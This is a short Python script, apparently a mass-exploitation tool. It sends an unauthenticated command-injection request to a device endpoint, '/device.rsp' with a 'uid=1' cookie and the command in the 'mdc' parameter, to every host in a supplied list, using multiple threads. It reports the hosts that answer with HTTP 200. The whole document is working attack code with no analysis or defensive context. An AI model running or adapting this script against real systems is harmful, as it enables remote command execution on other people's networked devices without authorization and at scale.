import requests
import argparse
import concurrent.futures
import urllib.parse

def exec(host, port, command):
    encoded_command = urllib.parse.quote(command)
    url = f"http://{host}:{port}/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc={encoded_command}"
    headers = {"Cookie": "uid=1"}

    try:
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            print(f"200 | {url}")
    except Exception:
        pass

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-f", "--file", required=True)
    parser.add_argument("-p", "--port", required=True)
    parser.add_argument("-c", "--command", required=True)
    parser.add_argument("-t", "--threads", type=int, default=10)
    args = parser.parse_args()

    with open(args.file) as f:
        hosts = [line.strip() for line in f if line.strip()]

    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        executor.map(lambda host: exec(host, args.port, args.command), hosts)

if __name__ == "__main__":
    main()
